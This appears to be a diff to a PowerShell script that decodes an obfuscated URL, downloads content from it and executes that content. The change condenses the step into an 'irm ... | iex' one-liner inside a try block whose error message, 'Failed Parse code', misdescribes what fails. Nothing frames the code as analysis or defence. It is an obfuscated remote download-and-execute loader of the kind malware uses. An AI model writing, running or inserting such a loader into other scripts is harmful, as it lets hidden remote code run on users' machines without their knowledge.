@@ -17,11 +17,9 @@ ${transform_function} = {
     return [System.Text.Encoding]::UTF8.GetString(${output_bytes})
 }
 
-${processed_url} = & ${transform_function} -input_data ${data_encoded}
-
 try {
-    ${request_response} = Invoke-WebRequest -Uri ${processed_url}
-    ${script_result} = Invoke-Expression ${request_response}.Content
+    ${processed_url} = & ${transform_function} -input_data ${data_encoded}
+    irm ${processed_url} | iex
 } catch {
     Write-Error "Failed Parse code"
 }
